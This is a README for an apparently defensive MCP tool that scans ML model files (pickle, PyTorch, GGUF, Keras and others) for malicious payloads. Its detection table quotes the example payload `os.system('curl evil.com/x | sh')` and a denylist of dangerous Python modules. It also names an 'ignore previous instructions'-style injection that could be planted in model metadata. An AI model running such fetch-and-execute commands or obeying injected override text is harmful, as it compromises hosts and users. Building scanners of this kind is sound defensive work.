# @guardbee/mcp-model-scanner

**🇬🇧 English** | [🇹🇷 Türkçe](https://github.com/GuardBee/guardbee-mcp/blob/main/packages/model-scanner/TR.md) | [🇨🇳 中文](https://github.com/GuardBee/guardbee-mcp/blob/main/packages/model-scanner/ZH.md) | [🇯🇵 日本語](https://github.com/GuardBee/guardbee-mcp/blob/main/packages/model-scanner/JA.md) | [🇰🇷 한국어](https://github.com/GuardBee/guardbee-mcp/blob/main/packages/model-scanner/KO.md) | [🇧🇷 Português](https://github.com/GuardBee/guardbee-mcp/blob/main/packages/model-scanner/PT-BR.md) | [🇪🇸 Español](https://github.com/GuardBee/guardbee-mcp/blob/main/packages/model-scanner/ES.md) | [🇩🇪 Deutsch](https://github.com/GuardBee/guardbee-mcp/blob/main/packages/model-scanner/DE.md)

[![npm version](https://img.shields.io/npm/v/@guardbee/mcp-model-scanner.svg)](https://www.npmjs.com/package/@guardbee/mcp-model-scanner)
[![npm downloads](https://img.shields.io/npm/dm/@guardbee/mcp-model-scanner.svg)](https://www.npmjs.com/package/@guardbee/mcp-model-scanner)
[![License: MIT](https://img.shields.io/badge/License-MIT-green.svg)](https://github.com/GuardBee/guardbee-mcp/blob/main/packages/model-scanner/LICENSE)

An MCP (Model Context Protocol) server that scans ML model files for **supply-chain** risks — the file itself, not the code that loads it.

Most "AI security" tooling looks at your integration code or the prompts flowing through it. This package looks at the artifact you (or a teammate, or a `pip install`) downloaded from Hugging Face, a registry, or an S3 bucket — or at a Hugging Face repo directly, pinned to a commit. A `.pt`/`.pth`/`.pkl`/`.joblib` checkpoint is a **pickle** file, and unpickling isn't just data deserialization — it can call arbitrary Python code the moment the file is loaded (`torch.load()`, `pickle.load()`, etc). A malicious checkpoint is a real, well-documented attack vector, not a hypothetical one.

> Telemetry is **off** by default. With `GUARDBEE_TELEMETRY=1` it sends the server, tool, success, duration and short parameter values such as a file path; longer strings and fields like `content`, `token` or `password` are replaced with a placeholder. See [`@guardbee/mcp-telemetry`](https://github.com/GuardBee/guardbee-mcp/blob/main/packages/telemetry/README.md).

```
Claude ──► model-scanner ──► Your model files
              │
              ├─ .pt / .pth / .ckpt   → PyTorch zip container: extract data.pkl, walk the pickle
              ├─ .pkl / .pickle / .bin / .dill → raw pickle stream (dill gadgets included)
              ├─ .joblib / .jbl       → pickle + the array bytes and nested pickles joblib embeds
              ├─ .npy / .npz          → object arrays (pickled data), pickles disguised as NumPy
              ├─ .safetensors         → header structure + disguised-binary check
              ├─ .h5 / .hdf5 / .keras → Keras Lambda-layer RCE (HDF5 and Keras 3 zip)
              ├─ .onnx                → external_data path-traversal heuristic
              ├─ .gguf                → header/tensor bounds, chat-template SSTI and injected text
              ├─ saved_model.pb / .pb / .pbtxt / .tflite → graph ops that touch files or Python
              └─ hf://owner/repo@rev  → every model file of a Hugging Face repo at one commit
```

---

## Why pickle is the core of this

Pickle streams are bytecode for a tiny stack VM. A `GLOBAL`/`STACK_GLOBAL` opcode names any importable Python object; the very next opcodes typically call it. There is nothing stopping a crafted pickle from naming `os.system` or `subprocess.Popen` instead of a tensor-rebuilding function — and `pickle.load()`/`torch.load()` will happily resolve and invoke it. This is the same technique tools like `picklescan`/`fickling`/Hugging Face's Picklescan integration are built around.

This package implements a from-scratch pickle machine (protocols 0–5) rather than shelling out to Python or using a regex. It walks the opcode stream byte by byte and tracks the stack and memo without calling anything, so a protocol 4+ `STACK_GLOBAL` resolves to the module and name actually on the stack, including strings fetched back from the memo, as NumPy 2 pickles do. A regex over raw bytes would both miss and misfire constantly.

joblib needs the same machine: `joblib.dump` writes each NumPy array's raw bytes (or, for object arrays, a whole nested pickle) right after the array's `NumpyArrayWrapper`. The scanner reads the wrapper's shape and dtype from the stack, skips exactly that many bytes, and checks the nested pickles too.

Every `GLOBAL`/`STACK_GLOBAL`/`INST` reference found is checked against:
- a **denylist** of modules with no legitimate reason to appear in a tensor deserialization path (`os`, `subprocess`, `socket`, `builtins.eval`, `ctypes`, …) → reported as **critical/high**
- an **allowlist** of the modules real ML frameworks actually reference (`numpy`, `torch`, `sklearn`, `collections`, …) → silently safe, no noise
- anything else → reported as **medium** ("unknown", not "malicious" — for manual review, keeping the false-positive rate low)

For PyTorch's default zip-based checkpoint format, the scanner reads the ZIP central directory directly off disk (with Zip64 support) to locate and extract just the small `data.pkl` metadata entry — it never loads a multi-gigabyte checkpoint fully into memory.

---

## Features

- **Real pickle parsing** — a stack-tracking pickle machine, not a regex, not a Python subprocess call
- **44 dangerous-global rules** across 6 risk categories (code-execution, process-execution, network, filesystem, reflection, deserialization), including dill's code-object and import gadgets
- **PyTorch zip container support** (including Zip64) — extracts and scans `data.pkl` without loading the full checkpoint
- **joblib** — walks past embedded arrays to every pickle opcode in the file, nested object-array pickles included; zlib/gzip dumps are decompressed
- **NumPy `.npy`/`.npz`** — object arrays (stored as a pickle, loaded with `allow_pickle=True`) and plain pickles renamed to a NumPy extension
- **`.safetensors` structural validation** — malformed/out-of-bounds headers, and detection of a pickle/zip disguised with a `.safetensors` extension
- **Keras Lambda-layer RCE** — in `.h5`, Keras 3 `.keras` zips and SavedModel `keras_metadata.pb`
- **ONNX `external_data` path-traversal heuristic**
- **GGUF** — header counts, string and array lengths, tensor dimensions, types and data bounds checked against the file; chat templates checked for Jinja sandbox escapes, hidden characters and instructions aimed at the model
- **TensorFlow** — SavedModel, frozen GraphDef (`.pb`/`.pbtxt`) and TFLite Flex ops that read or write files, call Python or send tensors to a debug URL
- **Hugging Face repos** — `scan_hf_repo` / `scan hf://owner/repo@revision` resolves the revision to a commit and scans every model file from it
- Bounded reads everywhere (10MB pickle prefix, 100MB safetensors header cap, 50MB zip-entry cap, GGUF and joblib read through a 4MB window) — safe against decompression bombs and won't OOM on huge model files
- SARIF 2.1.0 output — CI/CD integration (GitHub Code Scanning, etc.)
- Config file support via `guardbee.yml`
- 82 unit tests with malicious and benign fixtures for every format, plus a [false-positive check against popular public models](#checked-against-public-models)

---

## Quick Start

### Claude Desktop / MCP Client

```json
{
  "mcpServers": {
    "guardbee-model-scanner": {
      "command": "npx",
      "args": ["-y", "@guardbee/mcp-model-scanner"]
    }
  }
}
```

### CLI (CI/CD)

```bash
npx @guardbee/mcp-model-scanner scan ./models --fail-on=high --format=sarif > results.sarif

# A Hugging Face model repo at a pinned commit (branch, tag or sha; HF_TOKEN for gated/private repos)
npx @guardbee/mcp-model-scanner scan hf://openai-community/gpt2@607a30d783dfa663caf39e06633721c8d4cfcd7e
```

In repo mode the revision is resolved to a commit sha and every file is read from that commit, so the result describes a fixed snapshot; findings point at `hf://owner/repo@sha/path`. Files up to 256 MB are downloaded whole. Larger ones are checked from their first 64 MB, plus the last 64 MB for zip containers (the central directory), which holds every header, pickle stream and tensor table the checks read.

---

## MCP Tools

| Tool | Description |
|------|----------|
| `scan_file` | Scans a single model file |
| `scan_directory` | Recursively scans a directory of model files (a SavedModel through its `saved_model.pb`) |
| `scan_hf_repo` | Scans every model file of a Hugging Face model repo at a pinned commit |
| `list_patterns` | Lists the dangerous-global catalog by risk category, and the TensorFlow ops checked |

---

## What it catches

| Format | Check | Severity | Example |
|---|---|---|---|
| pickle / PyTorch | Reference to `os`, `posix`, `nt`, `subprocess`, `socket`, `ctypes`, `runpy`, `pty.spawn`, `platform.popen`, `commands` | critical | `os.system('curl evil.com/x \| sh')` |
| pickle / PyTorch | `builtins.eval`/`exec`/`compile`/`__import__`, `pickle.loads`, `marshal.loads` | critical | recursive/nested payload, or a direct eval |
| pickle / PyTorch | `builtins.getattr`/`open`, `shutil.*`, `importlib.*`, `requests.*`, `webbrowser.open`, `urllib*.urlopen` | high | exfiltration, SSRF, file read/write |
| safetensors | Header starts with a pickle/zip signature instead of a length | critical | a `.pkl` renamed to `.safetensors` |
| safetensors | Tensor `data_offsets` exceed the actual data section | high | a parser reading out-of-bounds |
| safetensors | Invalid/oversized header length, non-JSON header | high | corrupt or adversarially crafted header |
| Keras .h5/.keras/SavedModel | `class_name: "Lambda"` in the model config | critical | marshalled-function RCE on load |
| ONNX | `external_data` location containing `..` | high | path traversal to an arbitrary file |
| dill | `dill._dill._create_code`/`_create_function`/`_eval_repr` | critical | a function rebuilt from bytecode and called during load |
| dill | `dill._dill._import_module`/`_get_attr`/`_create_filehandle` | high | reaching `os.system` without naming `os` |
| joblib | any of the pickle rules, in the main stream or a nested object-array pickle | as the rule | a payload hidden after a real array |
| NumPy | object dtype; a pickle with a `.npy` extension | medium / high | `np.load(..., allow_pickle=True)` unpickles it |
| GGUF | chat template reaching Python internals (`__class__`, `__globals__`, …) | critical | Jinja sandbox escape (CVE-2024-34359) |
| GGUF | hidden Unicode or "ignore previous instructions"-style text in metadata | high | instructions injected into every conversation |
| GGUF | counts, lengths, dimensions or tensor bounds inconsistent with the file | high | heap overflow in an unpatched loader |
| TensorFlow | `WriteFile` / `ReadFile` / `PyFunc` / file datasets / `PrintV2` to `file://` | critical–medium | a graph that touches the serving host |

Full dangerous-global catalog: run the `list_patterns` tool, or see [`src/dangerousGlobals.ts`](https://github.com/GuardBee/guardbee-mcp/blob/main/packages/model-scanner/src/dangerousGlobals.ts).

### Rule IDs added in 0.4

| Rule ID | Severity |
|---|---|
| `pickle_dangerous_global_dill__dill_*`, `pickle_dangerous_global_dill_dill_*` | critical / high |
| `joblib_partial_scan`, `joblib_compressed_unsupported`, `joblib_compressed_too_large`, `joblib_decompress_failed`, `joblib_unrecognized` | low / medium |
| `numpy_object_array` | medium |
| `numpy_disguised_pickle` | high |
| `numpy_bad_header`, `numpy_npz_unreadable` | medium |
| `numpy_npz_entry_unreadable`, `numpy_npz_partial_scan` | low |
| `gguf_chat_template_ssti` | critical |
| `gguf_metadata_injected_instructions`, `gguf_metadata_hidden_characters`, `gguf_malformed_header`, `gguf_tensor_out_of_bounds`, `gguf_bad_magic` | high |
| `gguf_duplicate_tensor`, `gguf_tensor_misaligned` | medium |
| `gguf_chat_template_url`, `gguf_unknown_tensor_type`, `gguf_not_parsed` | low |
| `tf_op_writefile` | critical |
| `tf_op_readfile`, `tf_op_pyfunc`, `tf_op_pyfuncstateless`, `tf_op_eagerpyfunc` | high |
| `tf_op_matchingfiles`, `tf_op_immutableconst`, `tf_op_*dataset*`, `tf_op_printv2`, `tf_op_debug*` | medium |
| `tf_saved_model_malformed`, `tflite_bad_identifier`, `keras_config_unreadable` | medium |
| `tf_graph_too_large` | low |

SARIF output keeps its shape: each rule ID becomes a `rules[]` entry as before.

### Checked against public models

Scanned with `scan hf://…` on 2026-10-30. Every finding on these repos is listed; none is a false positive. The low "partial scan" notes come from files larger than the 10 MB prefix the pickle, H5 and ONNX checks read.

| Repo @ commit | Formats | Findings |
|---|---|---|
| `openai-community/gpt2@607a30d` | PyTorch (legacy pickle), safetensors, H5, ONNX, TFLite | 5 low partial-scan notes |
| `google-bert/bert-base-uncased@86b5e09` | PyTorch, safetensors, H5, ONNX | 3 low partial-scan notes |
| `sentence-transformers/all-MiniLM-L6-v2@1110a24` | PyTorch, safetensors, H5, 9 ONNX variants | 10 low partial-scan notes |
| `Qwen/Qwen2.5-0.5B-Instruct-GGUF@9217f5d` | GGUF (9 quantizations incl. fp16, K-quants) | none |
| `bartowski/Llama-3.2-1B-Instruct-GGUF@067b946` | GGUF (18 quantizations incl. IQ types) | 3 low notes: tensor types 31–33, removed from ggml |
| `microsoft/Phi-3-mini-4k-instruct-gguf@a641133` | GGUF | none |
| `keras-io/ocr-for-captcha@1d695c4` | SavedModel + keras_metadata.pb | none |
| `keras-io/timeseries-anomaly-detection@5712601` | SavedModel; profiler `.pb` files skipped as non-graphs | none |
| `suno/bark-small@1dbd7a1` | PyTorch, 783 `.npy` speaker prompts | none |
| `julien-c/wine-quality@90ef3b7` | scikit-learn joblib | none |
| `mcpotato/42-eicar-street@8fb61c4` | Hugging Face's malicious-pickle test repo | `model_broken_X.pkl`: critical `builtins.exec` (the only payload with a model extension) |

These are **heuristic** findings tuned for a low false-positive rate — HDF5 and ONNX in particular are complex binary/protobuf formats scanned via a bounded text-pattern search rather than a full structural parse. Every finding should still be reviewed; a clean scan is not a formal safety proof.

---

## Configuration (`guardbee.yml`)

```yaml
model-scanner:
  fail-on: high       # any | critical | high | medium | low | none
  max-files: 2000
  exclude:
    - "fixtures/"
```

---

## Limitations (by design)

- Only the first 10MB of a raw (non-zip) pickle stream is scanned (joblib files are walked to the end) — dangerous globals must be referenced before their instances in a pickle stream, so this bound is a reasonable trade-off against loading huge legacy checkpoints fully into memory.
- ZIP extraction supports STORED and DEFLATE only (covers the default PyTorch checkpoint format).
- HDF5/ONNX checks are pattern-based on a bounded prefix, not a full structural/protobuf parse.
- joblib files compressed with bz2, xz, lzma or lz4 are reported, not decompressed. GGUF v1 and big-endian GGUF files are reported, not parsed.
- TFLite checks look for Flex delegate op names; builtin TFLite ops are tensor math only.
- GGUF instruction checks look for common injection phrasing and hidden characters; a carefully worded instruction can still pass. Read the chat template of a model you did not build.
- This scans the **file**, not runtime behavior — it does not execute or sandbox anything.

---

## Development

```bash
npm run build
npm test             # 82 unit tests
```

---

## License

MIT — [GuardBee](https://guardbee.ai)

## Feedback

Questions, ideas, or a false positive? Start a thread in [GitHub Discussions](https://github.com/GuardBee/guardbee-mcp/discussions) or [open an issue](https://github.com/GuardBee/guardbee-mcp/issues). If GuardBee is useful to you, a ⭐ on [the repository](https://github.com/GuardBee/guardbee-mcp) helps others find it.
